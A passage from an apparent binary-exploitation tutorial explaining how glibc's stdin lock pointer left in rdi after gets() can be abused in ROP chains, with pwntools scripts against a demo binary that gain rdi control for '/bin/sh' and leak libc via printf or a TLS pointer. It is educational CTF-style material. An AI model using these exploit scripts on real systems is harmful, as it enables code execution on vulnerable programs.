<p>Above is the disassembly of <code>_IO_lock_unlock</code>. <code>rbp</code> stores the address of <code>stdin</code>, so <code>+182</code> is checking <code>_IO_USER_LOCK</code>. But then look at <code>+191</code>. Recall that <code>_lock</code> is stored at an offset of <code>+0x88</code>, so this must be loading <code>stdin._lock</code>, which as we know is <code>_IO_stdfile_0_lock</code>, and we see that it&#x27;s loading into <code>rdi</code>! Then pretty soon afterwards it returns, without clobbering <code>rdi</code> (<code>__lll_lock_wait_private</code> doesn&#x27;t clobber it either, it&#x27;s just a thin wrapper around the <code>futex</code> syscall).</p>
<figure><img src="/assets/image (125).png" alt=""><figcaption><p><code>__lll_lock_wait_private</code></p></figcaption></figure>
<p>So that&#x27;s where <code>_IO_stdfile_0_lock</code> comes from, but <del>where did it go?</del> <em>why</em> does <code>_lock</code> get loaded into <code>rdi</code>?</p>
<p>That&#x27;s a good question, to which my best guess would be that it&#x27;s an optimization made by the compiler. In the case where <code>lll_unlock</code> is called, the address of <code>_lock</code> is passed directly to the <code>futex</code> wrapper as the one and only argument (i.e. through the <code>rdi</code> register). Therefore it loads <code>_lock</code> into <code>rdi</code> so that it doesn&#x27;t need to use an extra assignment to prepare the call to <code>futex</code> like <code>mov rdi, [register containing _lock]</code>, which saves space and time.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="glibc-prior-to-230">glibc prior to <code>2.30</code><a href="#glibc-prior-to-230" class="hash-link" aria-label="Direct link to glibc-prior-to-230" title="Direct link to glibc-prior-to-230">​</a></h3>
<p>While we&#x27;re mainly looking at <code>2.34+</code>, let&#x27;s have a brief look at versions prior to that. It appears that prior to <code>2.30</code>, the disassembly looks a bit different. For example, the following is from <code>2.29</code>.</p>
<figure><img src="/assets/image (127).png" alt=""><figcaption><p>2.29 <code>_IO_lock_unlock</code></p></figcaption></figure>
<p>Instead of loading it into <code>rdi</code>, it loads it into <code>rdx</code>, then later into <code>rdi</code> just for the <code>futex</code> call? And what&#x27;s going on around the call to <code>__lll_unlock_wake_private</code> with <code>rsp</code>? This seems like a bizarre choice for the compiler to make, and the reason for that is that this part is <a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L195" target="_blank" rel="noopener noreferrer">written in assembly</a>. I couldn&#x27;t tell you why, but what I can say is that this causes problems for us, as <code>_lock</code> only gets loaded into <code>rdi</code> under very specific cirumstances, which hinders our potential techniques.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-this-behaviour">Detecting this behaviour<a href="#detecting-this-behaviour" class="hash-link" aria-label="Direct link to Detecting this behaviour" title="Direct link to Detecting this behaviour">​</a></h3>
<p>For fun, I decided to write a <a href="https://gist.github.com/sasha-999/1dcc54e932e59975da82b14691febc38" target="_blank" rel="noopener noreferrer">python script</a> which uses <code>angr</code> that can detect this behaviour automatically, for a given libc.</p>
<p>The libc doesn&#x27;t require debug symbols, and the script should work for <code>2.23-2.39</code>, as these were the versions I tested (<code>2.39</code> is the most recent version as of writing this).</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploit-techniques">Exploit techniques<a href="#exploit-techniques" class="hash-link" aria-label="Direct link to Exploit techniques" title="Direct link to Exploit techniques">​</a></h2>
<p>Now for the fun stuff. I&#x27;m gonna show you a few simple techniques which can help you with your ropping, one for controlling <code>rdi</code> and another for leaking libc.</p>
<p>I&#x27;ll demonstrate these using the demo program, which is patched to run using glibc 2.35 (that&#x27;ll be important later).</p>
<p><a href="/assets/files/demo-8d1f43bf5dc851d7d9ba52136a43c8c0.zip" target="_blank">demo.zip</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="controlling-rdi">Controlling <code>rdi</code><a href="#controlling-rdi" class="hash-link" aria-label="Direct link to controlling-rdi" title="Direct link to controlling-rdi">​</a></h3>
<p>One idea you may have already had is that, since <code>_IO_stdfile_0_lock</code> always ends up in <code>rdi</code> after a call to <code>gets</code>, and <code>gets</code> allows us to write arbitrary data to a pointer in <code>rdi</code>, then surely we can just write <code>/bin/sh</code> to <code>_IO_stdfile_lock</code>, right?</p>
<p>If you were thinking that, then good job, because you&#x27;re correct, we can!</p>
<p>Since <code>rdi -&gt; _IO_stdfile_0_lock</code>, another call to <code>gets</code> will write data there. Then we&#x27;d send <code>/bin/sh</code>, and then that 2nd call to <code>gets</code> will return <code>_IO_stdfile_0_lock -&gt; &quot;/bin/sh&quot;</code> in <code>rdi</code>. This would get around needing to use <code>pop rdi ; ret</code> to get a pointer to <code>/bin/sh</code>, so if you had <code>system</code> available, then you could get a shell!</p>
<p>One important thing to note is that after we overwrite the lock, <code>_IO_lock_unlock</code> will be executed before we return. This will decrement <code>cnt</code>, and if the new <code>cnt</code> is <code>0</code>, then <code>lll_unlock</code> will clobber our data! This is why it&#x27;s important to overwrite <code>cnt</code> to a value other than <code>1</code>, and we have to adjust that value to be <code>+1</code> more than what we want. The code for this would be as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;demo&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;ROP me if you can!\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">u8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;sh&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<figure><img src="/assets/image (118).png" alt=""><figcaption><p><code>rdi</code> control!</p></figcaption></figure>
<p>While this will of course <code>SEGFAULT</code>, we see our desired result of <code>rdi -&gt; &quot;/bin/sh&quot;</code>!</p>
<p>Another thing to note is that <code>/bin/sh</code> will remain in <code>_IO_stdfile_0_lock</code> until we change it back, so after any subequent calls to <code>gets</code>, we&#x27;ll get back this pointer to <code>/bin/sh</code>. Because even though the locking will increment the <code>cnt</code>, it will leave the rest of the contents alone, then unlocking will decrement it back.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>This relies on being able to skip over <code>lll_unlock</code> by having a large value for <code>cnt</code>.</p><p>But for <code>2.29</code> and prior, it only loads <code>_lock</code> into <code>rdi</code> when calling <code>lll_unlock</code>, so this won&#x27;t work as <code>rdi</code> won&#x27;t end up pointing to <code>_IO_stdfile_0_lock -&gt; &quot;/bin/sh&quot;</code>.</p></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>I also found out that I&#x27;m not the first person to discover this, <a href="https://app.hackthebox.com/users/70668" target="_blank" rel="noopener noreferrer">w3th4nds</a> beat me to it with the challenge <a href="https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BMedium%5D%20Sound%20of%20Silence" target="_blank" rel="noopener noreferrer">Sound of Silence</a>, and I wouldn&#x27;t be surprised if it&#x27;s been found/used before then, I just hadn&#x27;t seen it before writing this.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="leaking-libc">Leaking libc<a href="#leaking-libc" class="hash-link" aria-label="Direct link to Leaking libc" title="Direct link to Leaking libc">​</a></h3>
<p>There are a few ways you can leak libc using <code>gets</code>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="printf">printf<a href="#printf" class="hash-link" aria-label="Direct link to printf" title="Direct link to printf">​</a></h4>
<p>For one, if you have access to <code>printf</code>, then you can just use the trick above to enter a format string and then call <code>printf</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;%69$&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">u8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;p&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Another benefit of this is we can leak more than just libc: as long as it&#x27;s on the stack, after our ROP chain, it&#x27;s leakable!</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="puts">puts<a href="#puts" class="hash-link" aria-label="Direct link to puts" title="Direct link to puts">​</a></h4>
<p>But what if you don&#x27;t have <code>printf</code>, and instead have only <code>puts</code>? Well fear not, because we have another trick up our sleeves: <code>_lock.owner</code>.</p>
<p>Recall the <code>_IO_lock_t</code> structure:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> lock</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> cnt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">owner</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> _IO_lock_t</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>And also recall that <code>owner</code> gets assigned the address of the <code>TLS</code> structure for this thread. While it isn&#x27;t immediately at the start of the lock, it&#x27;s not far out of our reach, so what if we were able to pad upto to it, then call <code>puts</code>. Since <code>TLS</code> (at least for the main thread) is allocated relative to libc, all you&#x27;d need is the offset from <code>TLS</code> to libc base.</p>
<div class="theme-admonition theme-admonition-caution admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</div><div class="admonitionContent_BuS1"><p>Unfortunately this leak can cause problems depending on the kernel(?), because the TLS can be in different places on different machines, and it doesn&#x27;t seem to be fixable by using the same docker.</p><p>So keep that in mind when transferring the exploit to remote.</p><p>While I suspect this is due to a kernel difference, if anyone knows exactly why, I&#x27;d love to hear it, and I could include it here as well.</p></div></div>
<p>There are initially a few problems with this:</p>
<ul>
<li>All input using <code>gets</code> is terminated by a null byte</li>
<li><code>owner</code> gets <code>NULL</code>&#x27;ed when unlocking if <code>--cnt==0</code> (i.e. <code>cnt==1</code>)</li>
</ul>
<p>But both of these can be solved with one input:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>The main idea behind this is that we want to set <code>cnt=0</code>, so that when it comes to unlocking, it will decrement count <strong>first</strong>, then check it against <code>0</code>, which fails because now <code>cnt=0xffffffff</code>, due to an integer underflow. What this does is eliminate the terminating null byte from <code>gets</code>, but also since the check fails, <code>owner</code> doesn&#x27;t get <code>NULL</code>&#x27;ed, meaning we have uninterrupted padding upto <code>owner=TLS</code>, meaning we can then call <code>puts</code> and leak <code>TLS</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;demo&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;libc&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;ROP me if you can!\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tls </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;tls: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">tls</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tls </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28c0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;libc: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">address</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="adjusting-for-237">Adjusting for 2.37+<a href="#adjusting-for-237" class="hash-link" aria-label="Direct link to Adjusting for 2.37+" title="Direct link to Adjusting for 2.37+">​</a></h3>
<p>The above was tested on 2.35, and should work for 2.30-2.36, but 2.37 changed <a href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L37" target="_blank" rel="noopener noreferrer">_IO_lock_lock</a> and <a href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L70" target="_blank" rel="noopener noreferrer">_IO_lock_unlock</a> to:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_lock_lock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">void</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression operator" style="color:#393A34">*</span><span class="token macro property expression" style="color:#36acaa">__self </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> THREAD_SELF</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">SINGLE_THREAD_P </span><span class="token macro property expression operator" style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression constant" style="color:#36acaa">NULL</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">			      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro 